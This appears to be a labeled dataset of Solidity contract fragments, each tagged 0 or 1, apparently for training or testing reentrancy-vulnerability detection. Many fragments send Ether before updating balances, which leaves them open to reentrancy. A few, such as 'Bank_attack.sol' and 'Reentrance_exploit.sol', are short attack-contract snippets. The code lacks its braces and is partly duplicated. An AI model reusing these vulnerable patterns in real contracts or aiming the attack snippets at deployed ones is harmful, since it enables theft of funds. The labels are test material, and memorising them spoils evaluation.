uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
0
---------------------------------
451 15458.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data )
require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public  returns (bool success)  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require(value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
if (isContract(rx)) {
rx.tokenFallback( msg.sender, value, data );
return true;
return false;
1
---------------------------------
452 27398.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
453 36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
454 27159.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
if (isContract(to)) {
ContractReceiver rx = ContractReceiver( to );
require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require(value <= allowances_[from][msg.sender]);
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private returns (bool success) {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback(msg.sender, value, data);
return true;
1
---------------------------------
455 33851.sol
function donate(bytes32 hash) payable {
print(hash);
if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw;
uint256 tokens = (msg.value * price());
balances[msg.sender] = (balances[msg.sender] + tokens);
totalSupply = (totalSupply + tokens);
saleEtherRaised = (saleEtherRaised + msg.value);
if (!founder.call.value(msg.value)()) throw;
Donate(msg.value, tokens);
0
---------------------------------
456 19128.sol
function doWithdraw(address from, address to, uint256 amount) internal {
require(amount <= MAX_WITHDRAWAL);
require(balances[from] >= amount);
require(withdrawalCount[from] < 3);
balances[from] = balances[from].sub(amount);
to.call.value(amount)();
withdrawalCount[from] = withdrawalCount[from].add(1);
function withdraw(uint256 amount) public {
doWithdraw(msg.sender, msg.sender, amount);
function withdrawTo(address to, uint256 amount) public {
doWithdraw(msg.sender, to, amount);
function withdrawFor(address from, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, msg.sender, amount);
function withdrawForTo(address from, address to, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, to, amount);
0
---------------------------------
457 35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation);
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
458 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
459 Reentrance_02.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
function() public payable {}
1
---------------------------------
460 23088.sol
function atomicize(address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{
require(addrs.length == values.length && addrs.length == calldataLengths.length);
uint j = 0;
for (uint i = 0; i < addrs.length; i++) {
bytes memory calldata = new bytes(calldataLengths[i]);
for (uint k = 0; k < calldataLengths[i]; k++) {
calldata[k] = calldatas[j];
j++;
require(addrs[i].call.value(values[i])(calldata));
1
---------------------------------
461 28687.sol
function CashOut(uint _am) {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
1
---------------------------------
462 1430.sol
function callContract(address to, bytes data) onlyOwner public payable returns (bool) {
require(to.call.value(msg.value)(data));
return true;
0
---------------------------------
463 36334.sol
function buy_the_tokens() {
require(msg.sender == owner);
require(!bought_tokens);
require(sale != 0x0);
require(this.balance >= min_required_amount);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
0
---------------------------------
464 39749.sol
function calcRefund(address _addressToRefund) internal {
uint amount = balanceOf[_addressToRefund];
balanceOf[_addressToRefund] = 0;
if (amount > 0) {
if (_addressToRefund.call.value(amount)()) {
LogFundTransfer(_addressToRefund, amount, false);
} else {
balanceOf[_addressToRefund] = amount;
function safeWithdraw() public onlyAfterDeadline {
if (amountRaised >= fundingGoal){
fundingGoalReached = true;
LogGoalReached(bankRollBeneficiary, amountRaised);
crowdsaleClosed = true;
if (!fundingGoalReached) {
calcRefund(msg.sender);
if (msg.sender == owner && fundingGoalReached) {
bankrollBeneficiaryAmount = (this.balance*80)/100;
if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) {
LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false);
etherollBeneficiaryAmount = this.balance;
if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw;
LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false);
} else {
fundingGoalReached = false;
function emergencyWithdraw() public isEmergency  {
calcRefund(msg.sender);
0
---------------------------------
465 26523.sol
function claim_reward(uint uid, bytes32 passcode) public payable{
require(msg.value >= parameters["price"]);
require(is_passcode_correct(uid, passcode));
uint final_reward = get_reward(uid) + msg.value;
if (final_reward > parameters["price_poοl"])
final_reward = parameters["price_poοl"];
require(msg.sender.call.value(final_reward)());
parameters["price_poοl"] -= final_reward;
if (uid + 1 < users.length)
users[uid] = users[users.length - 1];
users.length -= 1;
1
---------------------------------
466 2071.sol
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _com;
_com = 0;
uint256 _long = _eth / 100;
address(otherF3DInc).call.value(_long)(bytes4(keccak256("deposit()")));
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _com;
_com = 0;
uint256 _long = _eth / 100;
address(otherF3DInc).call.value(_long)(bytes4(keccak256("deposit()")));
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
0
---------------------------------
467 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
468 37836.sol
function collect() onlyOwner {
require(addrcnt.call.value(this.balance)(0));
Collect(addrcnt,this.balance);
0
---------------------------------
469 36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
470 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
471 Reentrance_03.sol
function withdrawBalance_fixed() {
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
0
---------------------------------
472 39994.sol
function safeSend(address _recipient, uint _ether) internal preventReentry() returns (bool success_) {
if(!_recipient.call.value(_ether)()) throw;
success_ = true;
pragma solidity ^0.4.0;
contract Math
string constant VERSION = "Math 0.0.1 \n";
uint constant NULL = 0;
bool constant LT = false;
bool constant GT = true;
uint constant iTRUE = 1;
uint constant iFALSE = 0;
uint constant iPOS = 1;
uint constant iZERO = 0;
uint constant iNEG = uint(-1);
function withdraw(uint _ether) external canEnter hasEther(msg.sender, _ether) returns (bool success_) {
etherBalance[msg.sender] -= _ether;
safeSend(msg.sender, _ether);
success_ = true;
0
---------------------------------
473 38888.sol
function withdraw() onlyOwner {
if (!owner.call.value(this.balance)()) throw;
0
---------------------------------
474 38724.sol
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
return allowed[_owner][_spender];
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
contract ERC20nator is StandardToken, Ownable {
address public fundraiserAddress;
bytes public fundraiserCallData;
uint constant issueFeePercent = 2;
event requestedRedeem(address indexed requestor, uint amount);
event redeemed(address redeemer, uint amount);
function() payable {
uint issuedTokens = msg.value * (100 - issueFeePercent) / 100;
if(!owner.send(msg.value - issuedTokens)) throw;
if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw;
totalSupply += issuedTokens;
balances[msg.sender] += issuedTokens;
1
---------------------------------
475 29601.sol
function transferInternal(address from, address to, uint256 value, bytes data, bool useCustomFallback, string customFallback) internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(uint256 _time, address _from,address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
476 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
477 10297.sol
function execute0(address to, uint256 value, bytes data) private returns (address created)  {
if (to == 0) {
created = create0(value, data);
} else {
require(to.call.value(value)(data));
0
---------------------------------
478 13952.sol
function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled)
address _bankroller = msg.sender;
uint _collateral = getCollateral();
uint _balance = address(this).balance;
uint _available = _balance > _collateral ? _balance - _collateral : 0;
if (_amount > _available) _amount = _available;
_amount = ledger.subtract(_bankroller, _amount);
bankroll = ledger.total();
if (_amount == 0) return;
bytes4 _sig = bytes4(keccak256(_callbackFn));
require(_bankroller.call.value(_amount)(_sig));
emit BankrollRemoved(now, _bankroller, _amount, bankroll);
return _amount;
function sendProfits() public returns (uint _profits)
int _p = profits();
if (_p <= 0) return;
_profits = uint(_p);
profitsSent += _profits;
address _tr = getTreasury();
require(_tr.call.value(_profits)());
emit ProfitsSent(now, _tr, _profits);
function _betFailure(string _msg, uint _bet, bool _doRefund) private
if (_doRefund) require(msg.sender.call.value(_bet)());
emit BetFailure(now, msg.sender, _bet, _msg);
function _uncreditUser(address _user, uint _amt) private
if (_amt > credits[_user] || _amt == 0) _amt = credits[_user];
if (_amt == 0) return;
vars.totalCredits -= uint88(_amt);
credits[_user] -= _amt;
require(_user.call.value(_amt)());
emit CreditsCashedout(now, _user, _amt);
1
---------------------------------
479 27188.sol
function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected {
if(!target.call.value(amount)()) throw;
Transfer(amount, message, target, currentOwner);
function divest(uint amount) public {
if (investors[msg.sender].investment == 0 || amount == 0) throw;
investors[msg.sender].investment -= amount;
sumInvested -= amount;
this.loggedTransfer(amount, "", msg.sender, owner);
function payDividend() public {
uint dividend = calculateDividend();
if (dividend == 0) throw;
investors[msg.sender].lastDividend = sumDividend;
this.loggedTransfer(dividend, "Dividend payment", msg.sender, owner);
function doTransfer(address target, uint amount) public onlyOwner {
this.loggedTransfer(amount, "Owner transfer", target, owner);
1
---------------------------------
480 38651.sol
function cancelBuyOrder(address token, uint price) {
bytes32 h = sha256(token, price, msg.sender);
uint remain = buyOrders[h];
delete buyOrders[h];
if (!msg.sender.call.value(remain)()) throw;
CancelBuyOrder(h,token,price,msg.sender);
0
---------------------------------
481 14620.sol
function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public {
require(walletToTransfer != address(0));
require(address(this).balance >= weiAmount);
require(address(this) != walletToTransfer);
require(walletToTransfer.call.value(weiAmount)());
0
---------------------------------
482 74.sol
function upgradeToAndCall(uint256 version, address implementation, bytes data) payable public onlyProxyOwner {
upgradeTo(version, implementation);
require(address(this).call.value(msg.value)(data));
contract EternalStorageProxy is OwnedUpgradeabilityProxy, EternalStorage {}
0
---------------------------------
483 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
484 773.sol
function sellDai(uint256 _drawInAttodai, uint256 _lockedInCdpInAttoeth, uint256 _feeInAttoeth) private {
uint256 _wethBoughtInAttoweth = matchingMarket.sellAllAmount(dai, _drawInAttodai, weth, 0);
uint256 _refundDue = msg.value.add(_wethBoughtInAttoweth).sub(_lockedInCdpInAttoeth).sub(_feeInAttoeth);
if (_refundDue > 0) {
weth.withdraw(_refundDue);
require(msg.sender.call.value(_refundDue)());
function closeGiftedCdp(bytes32 _cdpId, uint256 _minimumValueInAttoeth, address _recipient) external wethBalanceIncreased returns (uint256 _payoutOwnerInAttoeth) {
require(_recipient != address(0));
uint256 _lockedPethInAttopeth = maker.ink(_cdpId);
uint256 _debtInAttodai = maker.tab(_cdpId);
uint256 _lockedWethInAttoweth = _lockedPethInAttopeth.div27(maker.per());
uint256 _wethSoldInAttoweth = matchingMarket.buyAllAmount(dai, _debtInAttodai, weth, _lockedWethInAttoweth);
uint256 _providerFeeInAttoeth = _wethSoldInAttoweth.mul18(providerFeePerEth);
uint256 _mkrBalanceBeforeInAttomkr = mkr.balanceOf(this);
maker.wipe(_cdpId, _debtInAttodai);
uint256 _mkrBurnedInAttomkr = _mkrBalanceBeforeInAttomkr.sub(mkr.balanceOf(this));
uint256 _ethValueOfBurnedMkrInAttoeth = _mkrBurnedInAttomkr.mul(uint256(maker.pep().read())).div(uint256(maker.pip().read()));
_payoutOwnerInAttoeth = _lockedWethInAttoweth.sub(_wethSoldInAttoweth).sub(_providerFeeInAttoeth).sub(_ethValueOfBurnedMkrInAttoeth);
require(_payoutOwnerInAttoeth >= _minimumValueInAttoeth);
maker.free(_cdpId, _lockedPethInAttopeth);
maker.exit(_lockedPethInAttopeth);
maker.give(_cdpId, msg.sender);
weth.withdraw(_payoutOwnerInAttoeth);
require(_recipient.call.value(_payoutOwnerInAttoeth)());
emit CloseCup(msg.sender, uint256(_cdpId));
0
---------------------------------
485 30178.sol
function buy() payable notPaused() public returns(bool) {
require(now >= salesStart);
require(now < salesDeadline);
uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE;
require(tokensToBuy > 0);
uint timeBonus = _calculateTimeBonus(tokensToBuy, now);
uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value);
uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus;
require(token.transfer(msg.sender, totalTokensToTransfer));
LogBought(msg.sender, msg.value, totalTokensToTransfer, 0);
require(wallet.call.value(msg.value)());
return true;
0
---------------------------------
486 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
487 18145.sol
function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner {
___upgradeTo(newTarget);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
488 21277.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
modifier onlyManager
require(msg.sender == manager);
contract EthernameRaw is Managed {
event Transfer(address indexed from, address indexed to, bytes32 indexed name);
event Approval(address indexed owner, address indexed approved, bytes32 indexed name);
event SendEther(address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value);
event Name(address indexed owner, bytes32 indexed name);
event Price(bytes32 indexed name, uint256 price);
event Buy(bytes32 indexed name, address buyer, uint256 price);
event Attribute(bytes32 indexed name, bytes32 key);
struct Record {
address owner;
uint256 price;
mapping (bytes32 => bytes) attrs;
string public constant name = "Ethername";
string public constant symbol = "ENM";
mapping (address => bytes32) public ownerToName;
mapping (bytes32 => Record) public nameToRecord;
mapping (bytes32 => address) public nameToApproved;
0
---------------------------------
489 14353.sol
function buy(){
require(sale != 0x0);
require(sale.call.value(this.balance)());
1
---------------------------------
490 Reentrance_exploit.sol
function deposit(address _vulnerable_contract) public payable {
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
491 22805.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
492 4598.sol
function futrMiner() public payable {
require(futr.call.value(msg.value)());
uint256 mined = ERC20(futr).balanceOf(address(this));
ERC20(futr).approve(mny, mined);
MNY(mny).mine(futr, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
function futxMiner() public payable {
require(futx.call.value(msg.value)());
uint256 mined = ERC20(futx).balanceOf(address(this));
ERC20(futx).approve(mny, mined);
MNY(mny).mine(futx, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
0
---------------------------------
493 Bank_attack.sol
function step1(uint256 amount) payable {
if (this.balance >= amount) {
victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount) {
step1(amount);
step2(amount / 2);
1
---------------------------------
494 40500.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenInterface {
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
uint256 public totalSupply;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0 && (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
